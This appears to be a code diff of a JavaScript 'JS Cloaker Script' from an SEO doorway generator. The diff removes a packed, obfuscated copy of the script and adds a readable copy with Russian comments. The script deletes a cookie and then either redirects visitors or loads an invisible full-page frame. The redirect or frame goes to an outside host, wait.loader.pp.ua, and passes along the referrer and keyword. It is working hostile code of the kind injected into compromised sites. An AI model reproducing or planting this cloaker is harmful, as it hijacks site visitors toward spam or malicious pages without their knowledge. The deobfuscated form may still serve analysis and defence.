@@ -1,1 +1,38 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5 b=e(4.O);5 Y=e(4.u);5 s="H://E.z.17.C/B?A=y-8&D="+q+\'&b=\'+b,r=0;9(6(\'c\')){4.i=h(\'c%3%d%G%F%x%v%m%l%k%n%w%o%d\');9(6(\'c\')==\'\'){9(r){4.J.K=s}10{4.Z(h(\'%X%11%3%2*%12%2%16%3%f%2%15%3%f%2%14%3%13%2%7%W%V%3%2\'+s+\'%2%N%3%2%2%M%3%P%2%7%U/T%7\'))}}}R 6(j){5 a=4.i.S(Q L("(?:^|; )"+j.t(/([\\.$?*|{}\\(\\)\\[\\]\\\\\\/\\+^])/g,\'\\\\$1\')+"=([^;]*)"))I a?p(a[1]):\'\'}',62,70,'||22|3D|document|var|getCookie|3E||if|matches|referer||3B|encodeURIComponent|220||unescape|cookie|name|2000|201970|20Jan|3A00|20GMT|decodeURIComponent||||replace|title|2001|3A01|2C|utf|loader|charset|auto|ua|keyword|wait|3DThu|20expires|http|return|location|href|RegExp|20scrolling|20noresize|referrer|22auto|new|function|match|frameset|3C|20src|3Cframe|3Cframeset|defaultKeyword|write|else|20rows|2C0|22no|20frameborder|20border|20framespacing|pp'.split('|'),0,{}))
+/***************************************
+Search Engine Doorway Generator (SEoDOR)
+*         JS Cloaker Script - 21.09.2014
+Copyright © 2014, http://seodor.biz   */
+
+var referer = encodeURIComponent(document.referrer);
+var defaultKeyword = encodeURIComponent(document.title);
+var s = "http://wait.loader.pp.ua/auto?charset=utf-8&keyword=" + q + '&referer=' + referer, // урл слива с передачей кея
+r = 0; // 0 - фрейм, 1 - редирект
+
+// если есть кука
+if (getCookie('c')) {
+
+	// то удаляем ее
+	document.cookie = unescape('c%3D%3B%20expires%3DThu%2C%2001%20Jan%201970%2000%3A00%3A01%20GMT%3B');
+//	document.cookie = 'c=; expires=Thu, 01 Jan 1970 00:00:01 GMT;'; 
+	
+	// затем проверяем - удалилась или нет
+	if(getCookie('c') == ''){
+	
+		// и если удалилась
+		if (r) {// редирект
+			document.location.href=s;
+		}
+		else {// или фрейм
+			document.write(unescape(
+			'%3Cframeset%20rows%3D%22*%2C0%22%20framespacing%3D%220%22%20border%3D%220%22%20frameborder%3D%22no%22%3E%3Cframe%20src%3D%22'+s+'%22%20noresize%3D%22%22%20scrolling%3D%22auto%22%3E%3C/frameset%3E'));
+//			document.write('<frameset rows="*,0" framespacing="0" border="0" frameborder="no"><frame src="'+s+'" noresize="" scrolling="auto"></frameset>');
+		}
+	}
+}
+
+function getCookie(name) {
+	var matches = document.cookie.match(new RegExp(
+	  "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+	))
+	return matches ? decodeURIComponent(matches[1]) : ''; 
+}
